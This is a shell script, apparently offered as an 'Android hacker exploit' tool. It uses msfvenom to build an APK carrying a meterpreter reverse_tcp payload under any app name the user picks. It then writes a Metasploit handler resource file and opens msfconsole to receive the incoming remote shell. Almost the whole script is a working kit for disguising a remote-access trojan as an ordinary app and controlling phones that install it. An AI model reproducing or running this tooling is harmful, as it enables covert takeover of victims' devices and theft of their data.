#!/bin/bash

LPARTH=`pwd`



clear

#logo or name
echo " WELCOME TO Android "

figlet -f standard HACKER

echo " EXPLOIT "


echo "============================================"
echo "your ip info.. "

ifconfig

#tool logo
echo "==========================================="
echo "==========||||||||||||||||||||||==========="
echo "==========||||HACKER-EXPLOIT||||==========="
echo "==========||||||||||||||||||||||==========="
echo "==========================================="
#data input
echo " please input your current interface ip "
read -p ' HE :~' IP

echo " please input your Choice Port number "
read -p ' HE :~ ' PORT


echo " please input your choice App name"
read -p ' HE :~ ' APPNAME 


#OUTPUT 

echo " ===============loading-100%================="

echo "file creating while 3 of 2 min "
sudo msfvenom -p android/meterpreter/reverse_tcp Lhost=$IP Lport=$PORT R -o $LPARTH/WH-output/$APPNAME.apk

#temp  file creating or remove .

echo "checking temp file and clear case data and temp dir for better perform "



rm -rf $LPARTH/temp


echo " ======================100%======================"

echo " Creating a msf temp dir" 


mkdir $LPARTH/temp

touch $LPARTH/temp/$APPNAME.rc 

#exquate ip & port & handeler & payload 

echo " use multi/handler" >> $LPARTH/temp/$APPNAME.rc 
echo " set PAYLOAD android/meterpreter/reverse_tcp " >> $LPARTH/temp/$APPNAME.rc
echo " set LHOST $IP " >> $LPARTH/temp/$APPNAME.rc
echo " set LPORT $PORT " >> $LPARTH/temp/$APPNAME.rc

echo " opening msfconsole  "


msfconsole -r $LPARTH/temp/$APPNAME.rc

bash $LPARTH/whe2


